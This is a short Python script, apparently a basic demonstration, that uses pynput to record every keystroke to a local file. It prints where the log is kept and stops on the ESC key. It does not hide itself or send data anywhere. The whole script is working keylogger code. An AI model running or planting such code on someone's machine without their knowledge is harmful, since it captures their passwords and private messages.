import os
from pynput import keyboard

LOG_FILE = "key_log.txt"


def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{key}]")


def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on ESC key
        return False


def main():
    print(f"Logging keystrokes to: {os.path.abspath(LOG_FILE)}")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()